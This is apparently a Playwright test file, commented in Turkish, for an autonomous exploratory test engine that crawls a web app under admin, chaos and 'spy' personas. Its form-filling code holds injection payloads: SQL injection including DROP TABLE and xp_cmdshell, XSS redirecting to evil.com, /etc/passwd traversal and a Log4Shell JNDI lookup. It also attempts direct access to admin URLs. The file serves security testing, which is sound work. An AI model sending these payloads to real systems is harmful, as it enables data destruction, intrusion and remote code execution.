/**
 * ╔═══════════════════════════════════════════════════════════════════════╗
 * ║                      PROJECT SENTINEL v1.0                            ║
 * ║            Otonom Yazılım Test Motoru (Autonomous SDET)               ║
 * ║                                                                       ║
 * ║  Kendi Kendini Yöneten, Üretken ve Bilişsel Playwright Test Engine   ║
 * ╚═══════════════════════════════════════════════════════════════════════╝
 * 
 * KURULUM:
 * npm install --save-dev @playwright/test @faker-js/faker
 * 
 * ÇALIŞTIRMA:
 * npx playwright test tests/sentinel-engine.spec.ts --headed
 * 
 * AMAÇ:
 * Sabit senaryolar yerine, uygulamayı bir insan gibi gezen, butonları keşfeden,
 * formları rastgele dolduran ve sistemin kırılma noktalarını kendi kendine bulan
 * bir Yapay Zeka Ajanı.
 */

import { test, expect, Page } from '@playwright/test';
import { faker } from '@faker-js/faker';

// ═══════════════════════════════════════════════════════════════════════
// SENTINEL CONFIGURATION
// ═══════════════════════════════════════════════════════════════════════

const SENTINEL_CONFIG = {
  MAX_STEPS: 50,               // Maksimum keşif adımı (reduced for quick test)
  MAX_RETRIES: 3,              // Crash sonrası yeniden deneme
  ACTION_TIMEOUT: 5000,        // Her aksiyon için timeout (ms)
  NAVIGATION_TIMEOUT: 10000,   // Navigasyon timeout (ms)
  STABILITY_WAIT: 1000,        // Sayfa stabilizasyonu (ms)
  CHAOS_INTENSITY: 0.7,        // Chaos Monkey yoğunluğu (0-1)
  DEEP_SCAN_ENABLED: true,     // Derin DOM tarama
  SCREENSHOT_ON_ERROR: true,   // Hata anında screenshot
  VERBOSE_LOGGING: true        // Detaylı loglama
};

// ═══════════════════════════════════════════════════════════════════════
// TYPE DEFINITIONS
// ═══════════════════════════════════════════════════════════════════════

type PersonaType = 'STRICT_ADMIN' | 'CHAOS_MONKEY' | 'SPY_MEMBER';
type HealthStatus = 'HEALTHY' | 'WARNING' | 'ERROR' | 'CRITICAL';

interface SentinelState {
  visitedUrls: Set<string>;
  visitedElements: Set<string>;
  navigationPath: string[];
  errors: SentinelError[];
  discoveries: Discovery[];
  interactions: number;
  persona: PersonaType;
  isAlive: boolean;
}

interface SentinelError {
  type: 'CONSOLE' | 'VISUAL' | 'NETWORK' | 'CRASH' | 'SECURITY';
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  message: string;
  timestamp: string;
  screenshot?: string;
  stackTrace?: string;
}

interface Discovery {
  screenName: string;
  url: string;
  interactiveElements: number;
  formsFound: number;
  timestamp: string;
}

interface HealthReport {
  status: HealthStatus;
  issues: string[];
  score: number; // 0-100
}

// ═══════════════════════════════════════════════════════════════════════
// MODÜL 1: AKILLI KEŞİF MOTORU (THE EXPLORER)
// ═══════════════════════════════════════════════════════════════════════

class ExplorerEngine {
  private state: SentinelState;
  private domSnapshots: Map<string, string>;

  constructor() {
    this.state = {
      visitedUrls: new Set(),
      visitedElements: new Set(),
      navigationPath: [],
      errors: [],
      discoveries: [],
      interactions: 0,
      persona: 'STRICT_ADMIN',
      isAlive: true
    };
    this.domSnapshots = new Map();
  }

  getState(): SentinelState {
    return this.state;
  }

  async captureSnapshot(page: Page): Promise<string> {
    const bodyHtml = await page.locator('body').innerHTML().catch(() => '');
    const currentUrl = page.url();
    this.domSnapshots.set(currentUrl, bodyHtml);
    return bodyHtml;
  }

  async detectNavigationChange(page: Page): Promise<boolean> {
    const currentUrl = page.url();
    const previousSnapshot = this.domSnapshots.get(currentUrl);
    const currentSnapshot = await this.captureSnapshot(page);
    
    if (!previousSnapshot) return true;
    
    // Basit diff: HTML uzunluğu %10'dan fazla değişmişse navigasyon var
    const changeRatio = Math.abs(currentSnapshot.length - previousSnapshot.length) / previousSnapshot.length;
    return changeRatio > 0.1;
  }

  async discoverInteractiveElements(page: Page): Promise<any[]> {
    const selectors = [
      'button:visible',
      'a:visible',
      'input[type="submit"]:visible',
      'input[type="button"]:visible',
      '[role="button"]:visible',
      '[onclick]:visible'
    ];

    const elements = [];
    
    for (const selector of selectors) {
      try {
        const found = await page.locator(selector).all();
        for (const el of found) {
          const isVisible = await el.isVisible().catch(() => false);
          const isEnabled = await el.isEnabled().catch(() => true);
          
          if (isVisible && isEnabled) {
            const text = await el.innerText().catch(() => '');
            const id = await el.getAttribute('id').catch(() => '');
            const className = await el.getAttribute('class').catch(() => '');
            
            const signature = `${selector}:${text}:${id}:${className}`;
            
            if (!this.state.visitedElements.has(signature)) {
              elements.push({
                element: el,
                signature,
                text,
                selector
              });
            }
          }
        }
      } catch (error) {
        // Element bulunamadı, devam et
      }
    }

    return elements;
  }

  async discoverForms(page: Page): Promise<any[]> {
    const forms = [];
    const formElements = await page.locator('form:visible').all();
    
    for (const form of formElements) {
      const inputs = await form.locator('input:visible, textarea:visible, select:visible').all();
      forms.push({
        form,
        inputs
      });
    }

    return forms;
  }

  recordDiscovery(page: Page, screenName: string, interactiveCount: number, formCount: number) {
    this.state.discoveries.push({
      screenName,
      url: page.url(),
      interactiveElements: interactiveCount,
      formsFound: formCount,
      timestamp: new Date().toISOString()
    });
    
    this.state.visitedUrls.add(page.url());
    this.state.navigationPath.push(screenName);
  }

  recordError(error: Omit<SentinelError, 'timestamp'>) {
    this.state.errors.push({
      ...error,
      timestamp: new Date().toISOString()
    });
  }

  markElementVisited(signature: string) {
    this.state.visitedElements.add(signature);
    this.state.interactions++;
  }

  kill() {
    this.state.isAlive = false;
  }

  generateReport(): string {
    const { visitedUrls, errors, discoveries, interactions, navigationPath } = this.state;
    
    const criticalErrors = errors.filter(e => e.severity === 'CRITICAL' || e.severity === 'HIGH');
    
    return `
╔═══════════════════════════════════════════════════════════════════════╗
║                    PROJECT SENTINEL - FINAL REPORT                    ║
╚═══════════════════════════════════════════════════════════════════════╝

📊 EXPLORATION STATS:
   • Toplam Keşfedilen Ekran: ${discoveries.length}
   • Ziyaret Edilen URL: ${visitedUrls.size}
   • Toplam İnteraksiyon: ${interactions}
   • Gezinti Derinliği: ${navigationPath.length}

🔍 DISCOVERIES:
${discoveries.map((d, i) => `   ${i + 1}. ${d.screenName} (${d.interactiveElements} element, ${d.formsFound} form)`).join('\n')}

❌ ERRORS FOUND:
   • Toplam Hata: ${errors.length}
   • Kritik Hatalar: ${criticalErrors.length}
   
${criticalErrors.length > 0 ? criticalErrors.map(e => `   [${e.severity}] ${e.type}: ${e.message}`).join('\n') : '   ✅ Kritik hata bulunamadı!'}

🗺️ NAVIGATION MAP:
   ${navigationPath.join(' → ')}

🎯 COVERAGE SCORE:
   • Element Coverage: ${Math.min(100, (interactions / 50) * 100).toFixed(1)}%
   • Screen Coverage: ${Math.min(100, (discoveries.length / 30) * 100).toFixed(1)}%
   • Overall Health: ${errors.length === 0 ? '✅ EXCELLENT' : errors.length < 5 ? '⚠️ GOOD' : '❌ POOR'}

═══════════════════════════════════════════════════════════════════════
    `;
  }
}

// ═══════════════════════════════════════════════════════════════════════
// MODÜL 2: DİNAMİK PERSONA SİMÜLASYONU (THE SHAPESHIFTER)
// ═══════════════════════════════════════════════════════════════════════

class PersonaSimulator {
  private currentPersona: PersonaType;

  constructor(persona?: PersonaType) {
    this.currentPersona = persona || this.selectRandomPersona();
  }

  selectRandomPersona(): PersonaType {
    const personas: PersonaType[] = ['STRICT_ADMIN', 'CHAOS_MONKEY', 'SPY_MEMBER'];
    return personas[Math.floor(Math.random() * personas.length)];
  }

  getPersona(): PersonaType {
    return this.currentPersona;
  }

  async login(page: Page): Promise<void> {
    console.log(`🎭 Persona Selected: ${this.currentPersona}`);

    // Login ekranına git
    await page.goto('/');
    await page.waitForTimeout(SENTINEL_CONFIG.STABILITY_WAIT);

    // "Hemen Başla" veya "Giriş Yap" butonunu bul
    const startButton = page.locator('button, a').filter({ hasText: /Hemen Başla|Giriş|Login/i }).first();
    
    if (await startButton.isVisible().catch(() => false)) {
      await startButton.click();
      await page.waitForTimeout(SENTINEL_CONFIG.STABILITY_WAIT);
    }

    // Telefon numarası girişi
    const phoneInput = page.locator('input[type="tel"], input[type="text"], input[placeholder*="numara"]').first();
    
    if (await phoneInput.isVisible().catch(() => false)) {
      let phoneNumber: string;
      
      switch (this.currentPersona) {
        case 'STRICT_ADMIN':
          phoneNumber = '1'; // Admin
          console.log('   👮‍♂️ Logging in as ADMIN (ID: 1)');
          break;
        case 'SPY_MEMBER':
          phoneNumber = '2'; // Member
          console.log('   🕵️ Logging in as MEMBER (ID: 2) - Will attempt privilege escalation');
          break;
        case 'CHAOS_MONKEY':
          phoneNumber = String(Math.floor(Math.random() * 10) + 1); // Random
          console.log(`   😈 Logging in as RANDOM USER (ID: ${phoneNumber})`);
          break;
      }

      await phoneInput.fill(phoneNumber);
      
      // Giriş butonunu bul ve tıkla
      const loginButton = page.locator('button[type="submit"], button').filter({ hasText: /Giriş|Devam|Login|Continue/i }).first();
      if (await loginButton.isVisible().catch(() => false)) {
        await loginButton.click();
        await page.waitForTimeout(SENTINEL_CONFIG.STABILITY_WAIT * 2);
      }
    }
  }

  async interact(page: Page, element: any): Promise<void> {
    const { element: el, text, selector } = element;

    switch (this.currentPersona) {
      case 'STRICT_ADMIN':
        // Normal, kontrollü tıklama
        await el.click({ timeout: SENTINEL_CONFIG.ACTION_TIMEOUT });
        await page.waitForTimeout(500);
        break;

      case 'CHAOS_MONKEY':
        // Agresif, hızlı tıklama
        if (Math.random() < SENTINEL_CONFIG.CHAOS_INTENSITY) {
          console.log('   😈 CHAOS MODE: Rapid clicking!');
          for (let i = 0; i < 3; i++) {
            await el.click({ timeout: 1000 }).catch(() => {});
            await page.waitForTimeout(100);
          }
        } else {
          await el.click({ timeout: SENTINEL_CONFIG.ACTION_TIMEOUT });
        }
        break;

      case 'SPY_MEMBER':
        // Normal tıklama ama URL manipülasyonu dene
        await el.click({ timeout: SENTINEL_CONFIG.ACTION_TIMEOUT });
        
        // Eğer admin ekranına girmeye çalışıyorsa, direkt URL değiştir
        if (Math.random() < 0.3) {
          const adminUrls = ['/admin', '/#admin', '/?screen=admin'];
          const targetUrl = adminUrls[Math.floor(Math.random() * adminUrls.length)];
          console.log(`   🕵️ SPY MODE: Attempting to access ${targetUrl}`);
          await page.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 5000 }).catch(() => {});
        }
        break;
    }
  }

  async fillForm(page: Page, inputs: any[]): Promise<void> {
    for (const input of inputs) {
      try {
        const type = await input.getAttribute('type').catch(() => 'text');
        const name = await input.getAttribute('name').catch(() => '');
        const placeholder = await input.getAttribute('placeholder').catch(() => '');

        let value: string;

        switch (this.currentPersona) {
          case 'STRICT_ADMIN':
            // Gerçekçi, geçerli veriler
            value = this.generateRealisticData(type, name, placeholder);
            break;

          case 'CHAOS_MONKEY':
            // Kaotik, sınır değerleri
            value = this.generateChaoticData(type, name);
            break;

          case 'SPY_MEMBER':
            // SQL Injection, XSS denemeleri
            value = this.generateMaliciousData(type, name);
            break;
        }

        await input.fill(value);
        await page.waitForTimeout(200);
      } catch (error) {
        // Input doldurma hatası, devam et
      }
    }
  }

  private generateRealisticData(type: string, name: string, placeholder: string): string {
    const lowerName = (name + placeholder).toLowerCase();

    if (type === 'email' || lowerName.includes('email') || lowerName.includes('e-posta')) {
      return faker.internet.email();
    }
    if (type === 'tel' || lowerName.includes('tel') || lowerName.includes('phone') || lowerName.includes('numara')) {
      return faker.phone.number('5########');
    }
    if (type === 'number' || lowerName.includes('age') || lowerName.includes('yaş')) {
      return String(faker.number.int({ min: 18, max: 40 }));
    }
    if (type === 'date' || lowerName.includes('date') || lowerName.includes('tarih')) {
      return faker.date.future().toISOString().split('T')[0];
    }
    if (lowerName.includes('name') || lowerName.includes('isim') || lowerName.includes('ad')) {
      return faker.person.fullName();
    }
    if (lowerName.includes('address') || lowerName.includes('adres')) {
      return faker.location.streetAddress();
    }
    if (lowerName.includes('price') || lowerName.includes('fiyat') || lowerName.includes('amount')) {
      return String(faker.number.int({ min: 100, max: 5000 }));
    }

    return faker.lorem.words(2);
  }

  private generateChaoticData(type: string, name: string): string {
    const chaoticOptions = [
      '😈💀🔥', // Emoji
      '<script>alert("XSS")</script>', // XSS
      "' OR '1'='1", // SQL Injection
      'A'.repeat(10000), // Very long string
      '"><img src=x onerror=alert(1)>', // HTML injection
      faker.lorem.paragraphs(50), // Huge text
      '0', // Edge case
      '-1', // Negative
      '999999999999', // Huge number
      '   ', // Whitespace
      '\n\n\n\n\n' // Newlines
    ];

    return chaoticOptions[Math.floor(Math.random() * chaoticOptions.length)];
  }

  private generateMaliciousData(type: string, name: string): string {
    const maliciousPayloads = [
      "admin' OR '1'='1' --",
      "1'; DROP TABLE users--",
      "<script>document.location='http://evil.com'</script>",
      "../../etc/passwd",
      "${jndi:ldap://evil.com/a}",
      "'; EXEC xp_cmdshell('dir')--"
    ];

    return maliciousPayloads[Math.floor(Math.random() * maliciousPayloads.length)];
  }
}

// ═══════════════════════════════════════════════════════════════════════
// MODÜL 3: BİLİŞSEL GÖRME SİMÜLASYONU (COGNITIVE VISION)
// ═══════════════════════════════════════════════════════════════════════

class CognitiveVision {
  async analyzeScreenHealth(page: Page): Promise<HealthReport> {
    const issues: string[] = [];
    let score = 100;

    // 1. Check for error classes
    const errorSelectors = [
      '.error',
      '.alert-danger',
      '[class*="error"]',
      '[class*="danger"]',
      '[role="alert"]'
    ];

    for (const selector of errorSelectors) {
      const errorElements = await page.locator(selector).count();
      if (errorElements > 0) {
        issues.push(`Found ${errorElements} error elements (${selector})`);
        score -= 10;
      }
    }

    // 2. Check for undefined/null/NaN in rendered text
    const bodyText = await page.locator('body').innerText().catch(() => '');
    const badPatterns = ['undefined', 'null', 'NaN', '[object Object]'];
    
    for (const pattern of badPatterns) {
      if (bodyText.includes(pattern)) {
        issues.push(`Found "${pattern}" in rendered content`);
        score -= 15;
      }
    }

    // 3. Check for White Screen of Death (WSOD)
    const bodyHtml = await page.locator('body').innerHTML().catch(() => '');
    if (bodyHtml.trim().length < 100) {
      issues.push('CRITICAL: Possible White Screen of Death (WSOD)');
      score = 0;
    }

    // 4. Check for broken images
    const brokenImages = await page.locator('img[src=""]').count();
    if (brokenImages > 0) {
      issues.push(`Found ${brokenImages} broken images`);
      score -= 5;
    }

    // 5. Check for console errors
    // (This will be handled by page.on('console') in main test)

    // Determine status
    let status: HealthStatus;
    if (score >= 80) status = 'HEALTHY';
    else if (score >= 60) status = 'WARNING';
    else if (score >= 30) status = 'ERROR';
    else status = 'CRITICAL';

    return {
      status,
      issues,
      score: Math.max(0, score)
    };
  }

  async detectCrash(page: Page): Promise<boolean> {
    // Check if page is responsive
    try {
      await page.locator('body').isVisible({ timeout: 2000 });
      return false;
    } catch {
      return true;
    }
  }

  async captureScreenshot(page: Page, filename: string): Promise<string> {
    if (!SENTINEL_CONFIG.SCREENSHOT_ON_ERROR) return '';
    
    const path = `test-results/sentinel-${filename}-${Date.now()}.png`;
    await page.screenshot({ path, fullPage: true }).catch(() => {});
    return path;
  }
}

// ═══════════════════════════════════════════════════════════════════════
// MODÜL 4: SELF-HEALING ENGINE
// ═══════════════════════════════════════════════════════════════════════

class SelfHealingEngine {
  private crashCount: number = 0;
  private lastHealthyUrl: string = '/';

  async attemptRecovery(page: Page, persona: PersonaSimulator): Promise<boolean> {
    this.crashCount++;
    
    if (this.crashCount > SENTINEL_CONFIG.MAX_RETRIES) {
      console.log('❌ Maximum retries exceeded. Engine shutting down.');
      return false;
    }

    console.log(`🔧 Self-Healing: Attempt ${this.crashCount}/${SENTINEL_CONFIG.MAX_RETRIES}`);

    try {
      // Step 1: Reload page
      await page.reload({ timeout: SENTINEL_CONFIG.NAVIGATION_TIMEOUT, waitUntil: 'domcontentloaded' });
      await page.waitForTimeout(SENTINEL_CONFIG.STABILITY_WAIT);

      // Step 2: Re-login
      await persona.login(page);

      // Step 3: Verify recovery
      const bodyVisible = await page.locator('body').isVisible({ timeout: 5000 }).catch(() => false);
      
      if (bodyVisible) {
        console.log('✅ Self-Healing successful!');
        this.crashCount = 0; // Reset counter
        this.lastHealthyUrl = page.url();
        return true;
      }

      return false;
    } catch (error) {
      console.log('❌ Self-Healing failed:', error);
      return false;
    }
  }

  recordHealthyState(url: string) {
    this.lastHealthyUrl = url;
  }

  getLastHealthyUrl(): string {
    return this.lastHealthyUrl;
  }
}

// ═══════════════════════════════════════════════════════════════════════
// SENTINEL MAIN ENGINE
// ═══════════════════════════════════════════════════════════════════════

class SentinelEngine {
  private explorer: ExplorerEngine;
  private persona: PersonaSimulator;
  private vision: CognitiveVision;
  private healer: SelfHealingEngine;

  constructor(personaType?: PersonaType) {
    this.explorer = new ExplorerEngine();
    this.persona = new PersonaSimulator(personaType);
    this.vision = new CognitiveVision();
    this.healer = new SelfHealingEngine();
  }

  async run(page: Page): Promise<void> {
    console.log('\n🚀 SENTINEL ENGINE STARTING...\n');

    // Setup console error listener
    page.on('console', (msg) => {
      if (msg.type() === 'error') {
        this.explorer.recordError({
          type: 'CONSOLE',
          severity: 'MEDIUM',
          message: msg.text()
        });
      }
    });

    // Setup crash handler
    page.on('crash', () => {
      this.explorer.recordError({
        type: 'CRASH',
        severity: 'CRITICAL',
        message: 'Browser page crashed'
      });
    });

    // Login
    try {
      await this.persona.login(page);
    } catch (error) {
      console.log('❌ Login failed:', error);
      this.explorer.kill();
      return;
    }

    // Main exploration loop
    for (let step = 0; step < SENTINEL_CONFIG.MAX_STEPS; step++) {
      if (!this.explorer.getState().isAlive) {
        console.log('⚠️ Engine killed. Stopping exploration.');
        break;
      }

      console.log(`\n📍 Step ${step + 1}/${SENTINEL_CONFIG.MAX_STEPS}`);
      console.log(`   Current URL: ${page.url()}`);

      // Health check
      const health = await this.vision.analyzeScreenHealth(page);
      console.log(`   Health: ${health.status} (Score: ${health.score}/100)`);

      if (health.status === 'CRITICAL') {
        console.log('   🚨 CRITICAL ISSUE DETECTED!');
        health.issues.forEach(issue => console.log(`      - ${issue}`));
        
        this.explorer.recordError({
          type: 'VISUAL',
          severity: 'CRITICAL',
          message: health.issues.join('; '),
          screenshot: await this.vision.captureScreenshot(page, `critical-${step}`)
        });

        // Attempt recovery
        const recovered = await this.healer.attemptRecovery(page, this.persona);
        if (!recovered) {
          this.explorer.kill();
          break;
        }
        continue;
      }

      // Record non-critical issues
      if (health.issues.length > 0) {
        health.issues.forEach(issue => {
          this.explorer.recordError({
            type: 'VISUAL',
            severity: 'LOW',
            message: issue
          });
        });
      }

      // Discover interactive elements
      const elements = await this.explorer.discoverInteractiveElements(page);
      const forms = await this.explorer.discoverForms(page);

      console.log(`   Found: ${elements.length} interactive elements, ${forms.length} forms`);

      // Record discovery
      const screenName = await this.detectScreenName(page);
      this.explorer.recordDiscovery(page, screenName, elements.length, forms.length);
      this.healer.recordHealthyState(page.url());

      // Fill forms first (if any)
      if (forms.length > 0 && Math.random() < 0.7) {
        console.log('   📝 Filling form...');
        const randomForm = forms[Math.floor(Math.random() * forms.length)];
        await this.persona.fillForm(page, randomForm.inputs);
        
        // Try to submit
        const submitBtn = await randomForm.form.locator('button[type="submit"], button').filter({ hasText: /kaydet|submit|gönder|devam|onayla/i }).first();
        if (await submitBtn.isVisible().catch(() => false)) {
          await submitBtn.click({ timeout: SENTINEL_CONFIG.ACTION_TIMEOUT }).catch(() => {});
          await page.waitForTimeout(SENTINEL_CONFIG.STABILITY_WAIT);
        }
      }

      // Click random element
      if (elements.length > 0) {
        const randomElement = elements[Math.floor(Math.random() * elements.length)];
        console.log(`   🖱️ Clicking: "${randomElement.text.substring(0, 30)}..."`);

        try {
          await this.persona.interact(page, randomElement);
          this.explorer.markElementVisited(randomElement.signature);
          await page.waitForTimeout(SENTINEL_CONFIG.STABILITY_WAIT);

          // Check if navigation occurred
          const navChanged = await this.explorer.detectNavigationChange(page);
          if (navChanged) {
            console.log('   ✅ Navigation detected!');
          }
        } catch (error) {
          console.log(`   ⚠️ Interaction failed: ${error.message}`);
        }
      } else {
        // No more elements, go back or restart
        console.log('   🔄 No elements found, going back...');
        await page.goBack({ timeout: SENTINEL_CONFIG.NAVIGATION_TIMEOUT, waitUntil: 'domcontentloaded' }).catch(() => {});
        await page.waitForTimeout(SENTINEL_CONFIG.STABILITY_WAIT);
      }

      // Random back navigation (exploration strategy)
      if (Math.random() < 0.15) {
        console.log('   🔙 Random back navigation...');
        await page.goBack({ timeout: SENTINEL_CONFIG.NAVIGATION_TIMEOUT, waitUntil: 'domcontentloaded' }).catch(() => {});
        await page.waitForTimeout(SENTINEL_CONFIG.STABILITY_WAIT);
      }
    }

    console.log('\n✅ SENTINEL ENGINE COMPLETED\n');
  }

  private async detectScreenName(page: Page): Promise<string> {
    // Try to extract screen name from page title, h1, or URL
    const title = await page.title().catch(() => '');
    const h1 = await page.locator('h1').first().innerText().catch(() => '');
    const url = page.url();

    if (h1) return h1;
    if (title) return title;
    
    // Extract from URL hash or query
    const match = url.match(/[#?](\w+)/);
    if (match) return match[1];

    return 'Unknown Screen';
  }

  generateReport(): string {
    return this.explorer.generateReport();
  }
}

// ═══════════════════════════════════════════════════════════════════════
// PLAYWRIGHT TESTS
// ═══════════════════════════════════════════════════════════════════════

test.describe('🤖 PROJECT SENTINEL - Otonom Test Suite', () => {
  // Set global timeout for all tests in this suite
  test.setTimeout(120000); // 2 minutes for each test
  
  test('👮‍♂️ Persona: Strict Admin - Controlled Exploration', async ({ page }) => {
    const sentinel = new SentinelEngine('STRICT_ADMIN');
    await sentinel.run(page);
    
    const report = sentinel.generateReport();
    console.log(report);
    
    // Assert: No critical errors should be found with strict admin
    expect(report).toContain('EXPLORATION STATS');
  });

  test('😈 Persona: Chaos Monkey - Stress Testing', async ({ page }) => {
    const sentinel = new SentinelEngine('CHAOS_MONKEY');
    await sentinel.run(page);
    
    const report = sentinel.generateReport();
    console.log(report);
    
    // Chaos monkey may find issues - that's expected
    expect(report).toContain('NAVIGATION MAP');
  });

  test('🕵️ Persona: Spy Member - Security Testing', async ({ page }) => {
    const sentinel = new SentinelEngine('SPY_MEMBER');
    await sentinel.run(page);
    
    const report = sentinel.generateReport();
    console.log(report);
    
    // Spy should attempt unauthorized access
    expect(report).toContain('ERRORS FOUND');
  });

  test('🎲 Persona: Random Mode - Full Autonomy', async ({ page }) => {
    test.setTimeout(120000); // 2 minutes
    
    // Let Sentinel choose its own persona randomly
    const sentinel = new SentinelEngine();
    await sentinel.run(page);
    
    const report = sentinel.generateReport();
    console.log(report);
    
    // Random mode should explore various paths
    expect(report).toContain('COVERAGE SCORE');
  });

  test('🔥 Marathon Mode - Extended Exploration (200 steps)', async ({ page }) => {
    test.setTimeout(300000); // 5 minutes
    
    const originalMaxSteps = SENTINEL_CONFIG.MAX_STEPS;
    SENTINEL_CONFIG.MAX_STEPS = 200; // Override for marathon
    
    const sentinel = new SentinelEngine('CHAOS_MONKEY');
    await sentinel.run(page);
    
    SENTINEL_CONFIG.MAX_STEPS = originalMaxSteps; // Restore
    
    const report = sentinel.generateReport();
    console.log(report);
    
    expect(report).toContain('FINAL REPORT');
  });

  test('🧪 Parallel Multi-Persona Simulation', async ({ browser }) => {
    // Run all 3 personas in parallel
    const personas: PersonaType[] = ['STRICT_ADMIN', 'CHAOS_MONKEY', 'SPY_MEMBER'];
    
    const results = await Promise.all(
      personas.map(async (persona) => {
        const context = await browser.newContext();
        const page = await context.newPage();
        
        const sentinel = new SentinelEngine(persona);
        await sentinel.run(page);
        
        const report = sentinel.generateReport();
        await context.close();
        
        return { persona, report };
      })
    );

    console.log('\n╔═══════════════════════════════════════════════════════════════════════╗');
    console.log('║             PARALLEL MULTI-PERSONA SIMULATION RESULTS                 ║');
    console.log('╚═══════════════════════════════════════════════════════════════════════╝\n');
    
    results.forEach(({ persona, report }) => {
      console.log(`\n🎭 ${persona}:\n${report}\n`);
    });

    expect(results.length).toBe(3);
  });
});

/**
 * ═══════════════════════════════════════════════════════════════════════
 * EXECUTION EXAMPLES:
 * ═══════════════════════════════════════════════════════════════════════
 * 
 * # Tüm testleri çalıştır (headed mode)
 * npx playwright test tests/sentinel-engine.spec.ts --headed
 * 
 * # Sadece Chaos Monkey
 * npx playwright test tests/sentinel-engine.spec.ts -g "Chaos Monkey" --headed
 * 
 * # Sadece Spy Member
 * npx playwright test tests/sentinel-engine.spec.ts -g "Spy Member" --headed
 * 
 * # Marathon mode (200 adım)
 * npx playwright test tests/sentinel-engine.spec.ts -g "Marathon" --headed
 * 
 * # Parallel simulation
 * npx playwright test tests/sentinel-engine.spec.ts -g "Parallel" --headed
 * 
 * # Headless mode (CI/CD için)
 * npx playwright test tests/sentinel-engine.spec.ts
 * 
 * # Debug mode
 * npx playwright test tests/sentinel-engine.spec.ts --debug
 * 
 * ═══════════════════════════════════════════════════════════════════════
 */
